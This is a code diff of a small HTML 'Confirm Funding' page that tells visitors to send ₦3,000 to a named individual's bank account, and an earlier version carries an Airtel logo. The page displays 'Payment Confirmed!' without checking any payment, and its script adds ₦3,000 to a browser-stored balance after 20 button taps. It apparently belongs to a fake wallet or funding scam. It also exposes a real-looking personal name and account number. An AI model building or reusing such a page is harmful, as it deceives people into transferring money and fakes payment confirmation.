@@ -2,88 +2,96 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Fund Wallet</title>
+  <title>Confirm Funding</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <style>
     body {
-      font-family: sans-serif;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #ffffffdd, #f2f2f2ee), url('your-logo.png') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 20px 30px;
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
       text-align: center;
-      padding: 2rem;
-      background-color: #fff;
+      max-width: 90%;
     }
-    .logo {
-      width: 80px;
-      animation: spin 2s linear infinite;
+
+    .card h2 {
+      margin-bottom: 10px;
+      color: #e60000;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+
+    .details {
+      margin: 20px 0;
     }
-    .account-card {
-      margin-top: 30px;
-      border: 2px solid red;
-      padding: 20px;
-      border-radius: 10px;
-      background: #fff;
+
+    .details p {
+      margin: 5px 0;
+      font-weight: bold;
     }
+
     button {
-      padding: 10px 20px;
-      background-color: red;
+      background: #e60000;
       color: white;
       border: none;
+      padding: 12px 25px;
       font-size: 16px;
-      margin-top: 20px;
+      border-radius: 30px;
       cursor: pointer;
     }
+
     .popup {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #4caf50;
-      color: white;
-      padding: 10px 20px;
-      border-radius: 5px;
+      margin-top: 15px;
+      padding: 10px;
+      background: #dfffdc;
+      border: 1px solid #7bdc59;
+      border-radius: 10px;
+      color: green;
       display: none;
-      z-index: 999;
     }
   </style>
 </head>
 <body>
-  <img src="your-airtel-logo.png" class="logo" alt="Airtel Logo">
-  <h2>Send ₦<span id="amount">3000</span> to:</h2>
-
-  <div class="account-card">
-    <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
-    <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
-    <p><strong>Account No:</strong> 812 489 0070</p>
+  <div class="card">
+    <h2>Send ₦3,000 to:</h2>
+    <div class="details">
+      <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
+      <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+      <p><strong>Account No:</strong> 812 489 0070</p>
+    </div>
+    <button onclick="tapFund()">I Have Made Payments</button>
+    <div class="popup" id="popup">Payment Confirmed! Please wait while we verify...</div>
   </div>
 
-  <button onclick="recordTap()">I Have Funded</button>
-
-  <div id="popup" class="popup">Payment recorded! Please wait...</div>
-
   <script>
-    const amountEl = document.getElementById("amount");
-    amountEl.innerText = localStorage.getItem("pendingAmount") || "3000";
+    let tapCount = localStorage.getItem('fundTapCount') || 0;
+    tapCount = parseInt(tapCount);
 
-    let tapCount = localStorage.getItem("fundTapCount") || 0;
-
-    function recordTap() {
+    function tapFund() {
       tapCount++;
-      localStorage.setItem("fundTapCount", tapCount);
+      localStorage.setItem('fundTapCount', tapCount);
 
       document.getElementById("popup").style.display = "block";
-      setTimeout(() => {
-        document.getElementById("popup").style.display = "none";
-      }, 2000);
+      document.getElementById("popup").textContent = "Payment Confirmed! Tap count: " + tapCount;
 
+      // Fund ₦3,000 after 20 taps
       if (tapCount >= 20) {
-        let currentBalance = parseInt(localStorage.getItem("user.balance") || "0");
-        currentBalance += 3000;
-        localStorage.setItem("user.balance", currentBalance);
-        localStorage.setItem("fundTapCount", 0);
-        alert("₦3,000 has been added to your balance!");
-        window.location.href = "dashboard.html";
+        let balance = parseInt(localStorage.getItem('user.balance') || 0);
+        balance += 3000;
+        localStorage.setItem('user.balance', balance);
+        localStorage.setItem('fundTapCount', 0); // reset for next funding
+        document.getElementById("popup").textContent = "₦3,000 successfully funded! 🎉";
       }
     }
   </script>
